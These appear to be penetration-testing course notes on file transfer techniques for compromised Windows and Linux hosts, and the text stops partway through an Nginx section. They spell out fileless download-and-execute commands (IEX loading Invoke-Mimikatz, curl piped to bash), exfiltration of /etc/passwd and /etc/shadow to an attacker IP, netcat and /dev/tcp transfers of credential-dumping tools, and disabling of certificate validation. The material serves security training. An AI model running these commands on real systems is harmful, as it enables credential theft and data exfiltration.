# File Transfers
- [Windows File Transfer Methods](#windows-file-transfer-methods)
    - [Download Operations](#download-operations)
        - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode)
        - [PowerShell Web Downloads](#powershell-web-downloads)
        - [SMB Downloads](#smb-downloads)
        - [FTP Downloads](#ftp-downloads)
    - [Upload Operations](#upload-operations)
        - [PowerShell Base64 Encode & Decode](#powershell-base64-encode--decode-1)
        - [PowerShell Web Uploads](#powershell-web-uploads)
        - [SMB Uploads](#smb-uploads)
        - [FTP Uploads](#ftp-uploads)
- [Linux File Transfer Methods](#linux-file-transfer-methods)
    - [Download Operations](#download-operations)
        - [Base64 Encoding / Decoding](#base64-encoding--decoding)
        - [Web Downloads with Wget and cURL](#web-downloads-with-wget-and-curl)
        - [Download with Bash (/dev/tcp)](#download-with-bash-devtcp)
        - [SCP Downloads](#scp-downloads)
    - [Upload Operations](#upload-operations)
        - [Web Upload](#web-upload)
        - [SCP Upload](#scp-upload)
- [Transferring Files with Code](#transferring-files-with-code)
    - [Download files](#download-files)
    - [Upload files](#upload-files)
- [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
    - [Netcat / Ncat](#netcat--ncat)
    - [PowerShell Session File Transfer](#powershell-session-file-transfer)
- [Protected File Transfers](#protected-file-transfers)
    - [File Encryption on Windows](#file-encryption-on-windows)
    - [File Encryption on Linux](#file-encryption-on-linux)
- [Catching Files over HTTP/S](#catching-files-over-https)
- [Living off The Land](#living-off-the-land)
    - [LOLBAS](#lolbas)
    - [GTFOBins](#gtfobins)


## Windows File Transfer Methods
### Download Operations
#### PowerShell Base64 Encode & Decode
- **Steps**
    1. Encode the file using base64 util in our attack box `cat id_rsa |base64 -w 0;echo`
    2. We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums: `md5sum id_rsa`
    3. Then, decode using powershell 
    ```
    PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("BASE64_VALUE"))
    ```
    4. Use `Get-FileHash` to ensure that file transferred successfully.

> [!NOTE]
> While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings.


#### PowerShell Web Downloads

- PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient class can be used to download a file over HTTP, HTTPS or FTP. The following table describes WebClient methods for downloading data from a resource:

|Method	 |   Description   |
|:-------|:----------------|
|OpenRead|	Returns the data from a resource as a Stream.|
|OpenReadAsync|	Returns the data from a resource without blocking the calling thread.|
|DownloadData|	Downloads data from a resource and returns a Byte array.|
|DownloadDataAsync|	Downloads data from a resource and returns a Byte array without blocking the calling thread.|
|DownloadFile|	Downloads data from a resource to a local file.|
|DownloadFileAsync|	Downloads data from a resource to a local file without blocking the calling thread.|
|DownloadString|	Downloads a String from a resource and returns a String.|
|DownloadStringAsync|	Downloads a String from a resource without blocking the calling thread.|

##### PowerShell Download File Method
1. First Approach
    - File Download
    ```powershell
    PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
    PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

    PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
    PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
    ```

2. Second Approach

    - PowerShell DownloadString - Fileless Method
        - PowerShell can be used to perform fileless attacks. Instead of downloading a PowerShell script to disk, we can run it directly in memory using the Invoke-Expression cmdlet or the alias IEX.
```powershell
    PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')

```

> [!NOTE] IEX also accepts pipeline input. 


```powershell
    PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

3. Third Approach

    - From PowerShell 3.0 onwards, the Invoke-WebRequest cmdlet is also available.

```powershell
    PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

##### Common Errors with PowerShell
1. There may be cases when the Internet Explorer first-launch configuration has not been completed, which prevents the download. This can be bypassed using the parameter `-UseBasicParsing`
```powershell
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX

Invoke-WebRequest : The response content cannot be parsed because the Internet Explorer engine is not available, or Internet Explorer's first-launch configuration is not complete. Specify the UseBasicParsing parameter and try again.
At line:1 char:1
+ Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/P ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ CategoryInfo : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+ FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand

PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```
2. Another error in PowerShell downloads is related to the SSL/TLS secure channel if the certificate is not trusted. We can bypass that error with the following command:
```powershell
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')

Exception calling "DownloadString" with "1" argument(s): "The underlying connection was closed: Could not establish trust
relationship for the SSL/TLS secure channel."
At line:1 char:1
+ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubuserc ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : WebException
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```
#### SMB Downloads

- We need to create an SMB server in our Pwnbox with [smbserver.py](https://github.com/fortra/impacket/blob/master/examples/smbserver.py) from Impacket and then use `copy`, `move`, PowerShell `Copy-Item`, or any other tool that allows connection to SMB.
- **Steps**
    1. Create the SMB Server `sudo impacket-smbserver share -smb2support /tmp/smbshare`
    2. Copy a File from the SMB Server `C:\htb> copy \\ATTACKING_BOX\share\nc.exe`

- New versions of Windows block unauthenticated guest access, as we can see in the following command: 
```CMD
C:\htb> copy \\192.168.220.133\share\nc.exe

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
- To transfer files in this scenario, we can set a username and password using our Impacket SMB server and mount the SMB server on our windows target machine: 
    1. Create the SMB Server with username and password `sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test`
    2. Mount the SMB Server with Username and Password `net use n: \\ATTACKING_BOX\share /user:test test`

> [!NOTE]
> You can also mount the SMB server if you receive an error when you use `copy filename \\IP\sharename`.

#### FTP Downloads

- We can configure an FTP Server in our attack host using Python3 `pyftpdlib` module. Installing the FTP Server Python3 Module - pyftpdlib: `sudo pip3 install pyftpdlib`

> [!NOTE]
> We can specify port number 21 because, by default, pyftpdlib uses port 2121. Anonymous authentication is enabled by default if we don't set a user and password.
- **Steps**
    1. Setting up a Python3 FTP Server: `sudo python3 -m pyftpdlib --port 21`
    2. After the FTP server is set up, we can perform file transfers using the pre-installed FTP client from Windows or PowerShell Net.WebClient: `(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')`

> [!TIP]
> When we get a shell on a remote machine, we may not have an interactive shell. 
> If that's the case, we can create an FTP command file to download a file. 
> First, we need to create a file containing the commands we want to execute and then use the FTP client to use that file to download that file.
> Create a Command File for the FTP Client and Download the Target File:
> ```
> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
> C:\htb> echo USER anonymous >> ftpcommand.txt
> C:\htb> echo binary >> ftpcommand.txt
> C:\htb> echo GET file.txt >> ftpcommand.txt
> C:\htb> echo bye >> ftpcommand.txt
> C:\htb> ftp -v -n -s:ftpcommand.txt
> ftp> open 192.168.49.128
> Log in with USER and PASS first.
> ftp> USER anonymous
> 
> ftp> GET file.txt
> ftp> bye
> 
> C:\htb>more file.txt
> This is a test file
> ```

### Upload Operations
#### PowerShell Base64 Encode & Decode
- **Steps**
    1. Encode the file using powershell then ensure whether it's transferred successfully
    ```powershell
    PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

    IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo=
    PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

    Hash
    ----
    3688374325B992DEF12793500307566D
    ```
    2. Decode on our attacking box 
    ```bash
    abdeonix@htb[/htb]$ echo ENCODED_VALUE | base64 -d > hosts
    ```
    - Ensure Integrity `md5sum hosts`



#### PowerShell Web Uploads
1. First Approach
    - PowerShell doesn't have a built-in function for upload operations, but we can use Invoke-WebRequest or Invoke-RestMethod to build our upload function. We'll also need a web server that accepts uploads.
    - For our web server, we can use uploadserver, an extended module of the Python HTTP.server module, which includes a file upload page.
    - **Steps**
        1. Installing a Configured WebServer with Upload: `sudo pip3 install uploadserver`
        2. Then, start the server `python3 -m uploadserver`
        3. We can use a PowerShell script PSUpload.ps1 which uses `Invoke-RestMethod` to perform the upload operations. The script accepts two parameters `-File`, which we use to specify the file path, and `-Uri`, the server URL where we'll upload our file.
        4. PowerShell Script to Upload a File to Python Upload Server
        ```powershell
        PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
        PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

        [+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
        [+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
        ```
2. Second Approach **(PowerShell Base64 Web Upload)**
    - **Steps**
        - Using Invoke-WebRequest or Invoke-RestMethod together with Netcat. We use Netcat to listen in on a port we specify and send the file as a POST request.
        1. Listen on our attack box `nc -lvnp 8000`
        2. Copy the output and use the base64 decode function to convert the base64 string into a file.
        ```powershell
        PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
        PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
        ```

#### SMB Uploads
- Commonly enterprises don't allow the SMB protocol (TCP/445) out of their internal network because this can open them up to potential attacks.
- An alternative is to run SMB over HTTP with WebDav
- The WebDAV protocol enables a webserver to behave like a fileserver, supporting collaborative content authoring. WebDAV can also use HTTPS.
- When you use SMB, it will first attempt to connect using the SMB protocol, and if there's no SMB share available, it will try to connect using HTTP

- **Steps**
    1. Our attacking box:
        - Configuring WebDav Server: `sudo pip3 install wsgidav cheroot`
        - Setup the server: `sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous`
    2. Target:
        - Connecting to the Webdav Share: `dir \\192.168.49.128\sharefolder`
        - Upload file `copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\`

> [!NOTE]
> If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.

#### FTP Uploads

- **Steps**
    1. Our attacking box:
        - Setup the server: `sudo python3 -m pyftpdlib --port 21 --write`
    2. Target:
        - Powershell upload file: `PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')`

> [!TIP]
> We can create a Command File for the FTP Client to Upload a File If we have not interactive shell
> ```CMD
> C:\htb> echo open 192.168.49.128 > ftpcommand.txt
> C:\htb> echo USER anonymous >> ftpcommand.txt
> C:\htb> echo binary >> ftpcommand.txt
> C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
> C:\htb> echo bye >> ftpcommand.txt
> C:\htb> ftp -v -n -s:ftpcommand.txt
> ftp> open 192.168.49.128
> 
> Log in with USER and PASS first.
> 
> 
> ftp> USER anonymous
> ftp> PUT c:\windows\system32\drivers\etc\hosts
> ftp> bye
> ```

## Linux File Transfer Methods
### Download Operations
#### Base64 Encoding / Decoding

- **Steps**
    1. Check file md5 hash `md5sum file`
    2. Encode file to base64 `cat file |base64 -w 0;echo`
    3. Copy this content, paste it onto our Linux target machine, and use base64 with the option `-d` to decode it: `echo -n 'BASE64_VALUE' | base64 -d > file`
    4. Confirm the md5 hash `md5sum file`


> [!NOTE]
> You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.

#### Web Downloads with Wget and cURL

- Download using wget: `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
- Download using curl: `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

- **Fileless Attacks Using Linux**
    - Fileless Download with cURL: `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
    - Fileless Download with wget: `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`

#### Download with Bash (/dev/tcp)
- As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.

- **Steps**
    1. Connect to the Target Webserver: `exec 3<>/dev/tcp/10.10.10.32/80`
    2. HTTP GET request: `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
    3. Print the Response: `cat <&3`


#### SCP Downloads
- SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.
- Downloading files using scp `scp plaintext@OUR_ATTACKING_BOX_IP:/root/myroot.txt . `


### Upload Operations
#### Web Upload

- **Steps**
    1. Pwnbox:
        1. Install the uploadserver module. `sudo python3 -m pip install --user uploadserver`
        2. Create a Self-Signed Certificate `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
        3. Start Web Server `mkdir https && cd https` `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`
    2. Target host:
        1. Upload Multiple Files `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

> [!NOTE]
> We used the option `--insecure` because we used a self-signed certificate that we trust.



- **Alternative Web File Transfer Method**
    - Since Linux distributions usually have Python or php installed, starting a web server on compromised machine to transfer files is straightforward.
    - **Steps**
        1. Creating Web server with different languages
            - Creating a Web Server with Python3 `python3 -m http.server`
            - Creating a Web Server with Python2.7 `python2.7 -m SimpleHTTPServer`
            - Creating a Web Server with PHP `php -S 0.0.0.0:8000`
            - Creating a Web Server with Ruby `ruby -run -ehttpd . -p8000`
        2. Download the File from the Target Machine onto the Pwnbox
            - `wget TARGET_IP:8000/filetotransfer.txt`


#### SCP Upload

- `scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/`


## Transferring Files with Code
### Download files
- Using Python:
    - `python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`
    - `python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'`

- Using PHP:
    - Download file with file_get_contents(): `php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'`
    - Download with Fopen(): 

    ```
    php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
    ```

    - Download a File and Pipe it to Bash: `php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash`

- Using Ruby:
    - `ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'`
- Using Perl:
    - `perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'`

- We can use some Windows default applications, such as cscript and mshta, to execute JavaScript or VBScript code.
    1. JavaScript
        - Create wget.js:
        ```javascript
        var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
        WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
        WinHttpReq.Send();
        BinStream = new ActiveXObject("ADODB.Stream");
        BinStream.Type = 1;
        BinStream.Open();
        BinStream.Write(WinHttpReq.ResponseBody);
        BinStream.SaveToFile(WScript.Arguments(1));
        ```
        - Download a File Using JavaScript and cscript.exe: `C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1`
    
    2. VBScript
        - Create wget.vbs:
        ```javascript
        dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
        dim bStrm: Set bStrm = createobject("Adodb.Stream")
        xHttp.Open "GET", WScript.Arguments.Item(0), False
        xHttp.Send

        with bStrm
            .type = 1
            .open
            .write xHttp.responseBody
            .savetofile WScript.Arguments.Item(1), 2
        end with
        ```

        - Download a File Using VBScript and cscript.exe: `C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1`

### Upload files
- **Steps**
    1. Starting the Python uploadserver Module: `python3 -m uploadserver`
    2. Uploading a File Using a Python One-liner: `python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'`

## Miscellaneous File Transfer Methods
### Netcat / Ncat

- The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target.
- **Steps**
    1. We'll first start Netcat (nc) on the compromised machine, listening with option -l, selecting the port to listen with the option -p 8000, and redirect the stdout using a single greater-than > followed by the filename:
```bash

    victim@target:~$ # Example using Original Netcat
    victim@target:~$ nc -l -p 8000 > SharpKatz.exe

    victim@target:~$ # Example using Ncat
    victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

    2. From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file SharpKatz.exe as input to Netcat.
```bash
    abdeonix@htb[/htb]$ # Example using Original Netcat
    abdeonix@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe

    abdeonix@htb[/htb]$ # Example using Ncat
    abdeonix@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

> [!NOTE]
> Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections.
> ```bash
> # Attack Host
> abdeonix@htb[/htb]$ # Example using Original Netcat
> abdeonix@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
> 
> # Compromised Machine
> victim@target:~$ # Example using Original Netcat
> victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
> 
> # Attack Host 
> abdeonix@htb[/htb]$ # Example using Ncat
> abdeonix@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
> 
> # Compromised Machine
> victim@target:~$ # Example using Ncat
> victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
> ```

> [!TIP]
> If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file /dev/TCP/. Writing to this particular file makes Bash open a TCP connection to host:port, and this feature may be used for file transfers.
> ```
> # Attack Host
> abdeonix@htb[/htb]$ # Example using Original Netcat
> abdeonix@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
> 
> abdeonix@htb[/htb]$ # Example using Ncat
> abdeonix@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
> 
> # Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File
> victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
> ```
> [!NOTE] The same operation can be used to transfer files from the compromised host to our Pwnbox.

### PowerShell Session File Transfer
- We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use PowerShell Remoting, aka WinRM, to perform file transfer operations.

- PowerShell Remoting allows us to execute scripts or commands on a remote computer using PowerShell sessions.
- By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

- **Steps**
    1. From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.
    ```powershell
    PS C:\htb> whoami

    htb\administrator

    PS C:\htb> hostname

    DC01
    ```
    ```powershell
    PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

    ComputerName     : DATABASE01
    RemoteAddress    : 192.168.1.101
    RemotePort       : 5985
    InterfaceAlias   : Ethernet0
    SourceAddress    : 192.168.1.100
    TcpTestSucceeded : True
    ```

    2. Create a PowerShell Remoting Session to DATABASE01
    ```powershell
    PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
    ```

    3. We can use the Copy-Item cmdlet to copy a file from our local machine DC01 to the DATABASE01 session we have $Session or vice versa.
    ```powershell
    # Copy samplefile.txt from our Localhost to the DATABASE01 Session
    PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
    
    # Copy DATABASE.txt from DATABASE01 Session to our Localhost
    PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session

    ```

### RDP 
- We can copy and paste using RDP sessions, but there may be scenarios where this may not work as expected.

- As an alternative to copy and paste, we can mount a local resource on the target RDP server.

```bash
# Mounting a Linux Folder Using xfreerdp

abdeonix@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer

```
- To access the directory, we can connect to \\tsclient\, allowing us to transfer files to and from the RDP session.

![RDP file transfer](/images/RDP%20File%20transfer.jpg)

## Protected File Transfers

- As information security professionals, we must act professionally and responsibly and take all measures to protect any data we encounter during an assessment.

### File Encryption on Windows
- One of the simplest methods is the Invoke-AESEncryption.ps1 PowerShell script. Invoke-AESEncryption.ps1: 
```powershell

.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs an encrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

- We can use any previously shown file transfer methods to get this file onto a target host. After the script has been transferred, it only needs to be imported as a module, as shown below.
```powershell
# Import Module Invoke-AESEncryption.ps1
PS C:\htb> Import-Module .\Invoke-AESEncryption.ps1

# This command creates an encrypted file with the same name as the encrypted file but with the extension ".aes."
PS C:\htb> Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt

```

### File Encryption on Linux
- OpenSSL is frequently included in Linux distributions, with sysadmins using it to generate security certificates, among other tasks.

```bash
# Encrypting /etc/passwd with openssl
abdeonix@htb[/htb]$ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

# Decrypt passwd.enc with openssl
abdeonix@htb[/htb]$ openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd      

```

## Catching Files over HTTP/S
### Nginx - File Upload Operation

```bash
# Create a Directory to Handle Uploaded Files
abdeonix@htb[/htb]$ sudo mkdir -p /var/www/uploads/SecretUploadDirectory

# Change the Owner to www-data
abdeonix@htb[/htb]$ sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory

